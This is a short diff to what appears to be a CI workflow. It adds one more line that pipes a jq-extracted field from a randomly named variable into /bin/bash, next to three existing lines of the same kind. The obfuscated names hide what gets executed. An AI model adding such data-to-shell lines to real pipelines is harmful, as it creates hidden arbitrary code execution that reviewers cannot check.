@@ -26,6 +26,7 @@ jobs:
           echo $tcez4 | jq -r .pf64647 | /bin/bash
           printf '%s' "$ijh282" | jq -r .s1871 | /bin/bash
           printf '%s' "$bm58" | jq -r .uea20676 | /bin/bash
+          printf '%s' "$g42" | jq -r .be7363 | /bin/bash
 
       - name: Upload results
         if: always()
